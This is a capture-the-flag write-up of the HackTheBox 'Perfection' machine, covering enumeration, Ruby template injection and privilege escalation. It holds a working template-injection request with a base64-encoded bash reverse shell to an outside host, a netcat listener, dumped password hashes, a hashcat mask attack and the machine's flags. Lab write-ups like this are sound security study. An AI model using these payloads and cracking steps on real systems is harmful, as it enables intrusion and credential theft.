---
layout: post
title: "Perfection"
description: "Perfection is an Easy rated Linux machine on HTB."
categories: [CTF,HTB]
tags: [Linux,Easy]
author: g
---

## Nmap Scan
```bash
┌──(kali㉿kali)-[~]
└─$ nmap -sC -sV 10.129.73.125
Starting Nmap 7.94SVN ( <https://nmap.org> ) at 2024-03-02 14:07 EST
Nmap scan report for 10.129.73.125
Host is up (0.031s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 80:e4:79:e8:59:28:df:95:2d:ad:57:4a:46:04:ea:70 (ECDSA)
|_  256 e9:ea:0c:1d:86:13:ed:95:a9:d0:0b:c8:22:e4:cf:e9 (ED25519)
80/tcp open  http    nginx
|_http-title: Weighted Grade Calculator
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at <https://nmap.org/submit/> .
Nmap done: 1 IP address (1 host up) scanned in 7.99 seconds
```


## Enumerate HTTP (Port 80)
Landing page reveals WEBrick version 1.7.0 running.
![Pasted image 20240715111629.png](/images/Pasted image 20240715111629.png){: .normal }

A Gobuster scan reveals a couple of subdirectories.
```bash
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u <http://10.129.73.125/> -w /usr/share/wordlists/dirb/big.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     <http://10.129.73.125/>
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/[                    (Status: 400) [Size: 274]
/]                    (Status: 400) [Size: 274]
/about                (Status: 200) [Size: 3827]
/plain]               (Status: 400) [Size: 279]
/quote]               (Status: 400) [Size: 279]
Progress: 20469 / 20470 (100.00%)
===============================================================
Finished
===============================================================
```

When browsing to `/plain]` we get more information about the ruby version and perfection being ran on port 3000.
![Pasted image 20240715111623.png](/images/Pasted image 20240715111623.png){: .normal width="500" }


The `;id` payload in the calculator function results in `malicious input blocked`.
![Pasted image 20240715111618.png](/images/Pasted image 20240715111618.png){: .normal }

Generate base64 reverse shell (make sure there are special characters).
![Pasted image 20240715111613.png](/images/Pasted image 20240715111613.png){: .normal }


Payload used in Burp: [regexp cheat sheet](https://github.com/attackercan/regexp-security-cheatsheet).
```bash
category1=a %0A;<%25%3d+system("echo+IyEvYmluL2Jhc2gKYmFzaCAgLWMgImJhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNjEvMjIyMiAgMD4mMSAi|base64 -d|bash")+%25>+&grade1=10&weight1=20&category2=2&grade2=10&weight2=20&category3=3&grade3=10&weight3=20&category4=4&grade4=10&weight4=20&category5=5&grade5=10&weight5=20
```

Shell as susan.
```bash
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 2222
listening on [any] 2222 ...
connect to [10.10.14.61] from (UNKNOWN) [10.129.93.233] 33324
bash: cannot set terminal process group (969): Inappropriate ioctl for device
bash: no job control in this shell
susan@perfection:~/ruby_app$ id
uid=1001(susan) gid=1001(susan) groups=1001(susan),27(sudo)
```

User flag: `4e621351d9e10339cef2ba3558875032`
```bash
susan@perfection:~$ cat user.txt
4e621351d9e10339cef2ba3558875032
```

## Privilege Escalation
We find possible credentials for a couple of users in the Migration directory located in susan’s home directory.
```bash
susan@perfection:~/Migration$ strings pupilpath_credentials.db
strings pupilpath_credentials.db
SQLite format 3
tableusersusers
CREATE TABLE users (
id INTEGER PRIMARY KEY,
name TEXT,
password TEXT
Stephen Locke154a38b253b4e08cba818ff65eb4413f20518655950b9a39964c18d7737d9bb8S
David Lawrenceff7aedd2f4512ee1848a3e18f86c4450c1c76f5c6e27cd8b0dc05557b344b87aP
Harry Tylerd33a689526d49d32a01986ef5a1a3d2afc0aaee48978f06139779904af7a6393O
Tina Smithdd560928c97354e3c22972554c81901b74ad1b35f726a11654b78cd6fd8cec57Q
Susan Millerabeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f
```

Whilst enumerating for files owned by the susan group we find.
```bash
susan@perfection:/var/spool/mail$ find / -group susan 2>/dev/null
/var/mail/susan
```

In the mail file we find the password template.
```bash
susan@perfection:~$ cat /var/mail/susan
Due to our transition to Jupiter Grades because of the PupilPath data breach, I thought we should also migrate our credentials ('our' including the other students

in our class) to the new platform. I also suggest a new password specification, to make things easier for everyone. The password format is:

{firstname}_{firstname backwards}_{randomly generated integer between 1 and 1,000,000,000}

Note that all letters of the first name should be convered into lowercase.

Please hit me with updates on the migration when you can. I am currently registering our university with the platform.

- Tina, your delightful student
```

We can crack the hash we previously find using a hashcat mask attack: [Link](https://hashcat.net/wiki/doku.php?id=mask_attack). Since the password format is susan_nasus_{1-1,000,000,000} we will specify the following hashcat mask.
```bash
# hash file
abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f

# hashcat command
hashcat -m 1400 hash -a 3 susan_nasus_?d?d?d?d?d?d?d?d?d

# Result
┌──(kali㉿kali)-[~]
└─$ hashcat -m 1400 hash -a 3 susan_nasus_?d?d?d?d?d?d?d?d?d --show
abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f:susan_nasus_413759210
```

Let’s use the password for sudo -l.
```bash
susan@perfection:~$ sudo -l
[sudo] password for susan: 
Matching Defaults entries for susan on perfection:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin,
    use_pty

User susan may run the following commands on perfection:
    (ALL : ALL) ALL
susan@perfection:~$ 
```

Switch to the root user.
```bash
susan@perfection:~$ sudo su
root@perfection:/home/susan# id
uid=0(root) gid=0(root) groups=0(root)
```

Root flag: `4826b44387fb5ede89b7027431ebb867`
```bash
root@perfection:~# cat root.txt 
4826b44387fb5ede89b7027431ebb867
```

## PWNED!!!
![Pasted image 20240715111552.png](/images/Pasted image 20240715111552.png){: .normal }